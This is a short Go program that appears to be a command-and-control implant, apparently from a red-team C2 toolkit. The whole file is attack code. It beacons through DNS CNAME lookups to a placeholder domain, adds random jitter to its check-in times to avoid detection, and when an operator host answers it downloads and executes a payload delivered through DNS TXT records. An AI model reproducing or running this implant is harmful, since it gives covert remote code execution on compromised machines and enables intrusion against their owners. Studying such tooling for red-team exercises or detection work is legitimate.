package main

import (
	"math/rand"
	"time"

	"github.com/averagesecurityguy/c2/beacon"
	"github.com/averagesecurityguy/c2/downloader"
)

const domain = "domain.com"
const offset = 12 // In seconds
const base = 0    // In hours
const sleep = 1  // In seconds

func main() {
	sysid := "uuid"
	checkIn := time.Now()
	beacon := beacon.NewDnsCnameBeacon(sysid, domain)
	downloader := downloader.NewDnsTxtDownloader()

	for {
		if checkIn.Before(time.Now()) {
			host := beacon.Ping()

			if host != "" {
				downloader.DownloadExec(host)
			}

			checkIn = updateCheckinTime()
		}

		time.Sleep(sleep * time.Second)
	}
}

// updateCheckinTime returns the next checkin time for the beacon. The time
// is calculated by adding base hours to the current time and a random number
// of seconds between <= offset.
func updateCheckinTime() time.Time {
	t := time.Now()
	base := time.Duration(base) * time.Hour
	jitter := time.Duration(rand.Intn(offset)) * time.Second

	return t.Add(base).Add(jitter)
}
